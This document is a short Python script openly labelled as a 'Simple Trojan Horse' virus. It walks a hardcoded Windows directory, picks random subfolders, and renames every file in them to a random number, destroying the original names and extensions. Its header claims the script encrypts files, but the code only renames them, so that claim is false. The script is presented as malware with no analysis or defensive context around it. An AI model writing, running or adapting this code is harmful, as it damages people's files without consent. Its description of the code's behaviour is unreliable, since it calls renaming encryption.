# #### Virus-1: Simple Trojan Horse
# Feature: Encrypt files with unknown format and make it unreadable
import os
import numpy as np
import string
   

def main():
    dr="D:/Execution/1/"
    os.chdir(dr)
    drlist=os.listdir(dr)
    ln=len(drlist)
    print(drlist)
    print(os.path.getsize(dr))
    des=[]
    for i in drlist:
        if os.path.isdir(dr+i)==True:
            des.append(1)
        else:
            des.append(0)
    print(des)
    print("Present Directory(main()): \n",os.getcwd())
    print("Length:",len(drlist))
    for i in range(len(drlist)+10):
            randattack=np.random.randint(0,len(drlist))
            print("Present Attack index: ",randattack)
            try:
                os.mkdir(dr+"/"+drlist[randattack]+"/"+drlist[randattack])
                drp=dr+"/"+drlist[randattack]+"/"+drlist[randattack]
                os.chdir(drp)
                plistloc=dr+drlist[randattack]+"/"
                plist=os.listdir(plistloc)
                print(plist)
                for j in range(len(plist)):
                    if os.path.isfile(plistloc+plist[j])==True:
                         os.rename(plistloc+plist[j],plistloc+str(np.random.randint(200)))
                print("Present Directory(main): \n",os.getcwd())
            except:
                pass

if __name__=="__main__":
    main()
